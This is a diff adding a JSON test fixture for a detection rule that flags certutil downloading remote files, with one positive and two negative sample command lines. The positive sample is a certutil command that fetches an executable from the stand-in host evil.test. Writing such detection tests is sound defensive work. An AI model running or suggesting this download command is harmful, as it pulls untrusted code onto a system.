@@ -1,0 +1,19 @@
+{
+  "key": "org.sigma-certutil-download-of-remote-file",
+  "positive": [
+    {
+      "Path": "C:\\Windows\\System32\\certutil.exe",
+      "CommandLine": "certutil -urlcache -f http://evil.test/a.exe a.exe"
+    }
+  ],
+  "negative": [
+    {
+      "Path": "C:\\Windows\\System32\\certutil.exe",
+      "CommandLine": "certutil -urlcache -f http://internal.example/a.crt a.crt"
+    },
+    {
+      "Path": "C:\\Windows\\System32\\certutil.exe",
+      "CommandLine": "certutil -viewstore my"
+    }
+  ]
+}
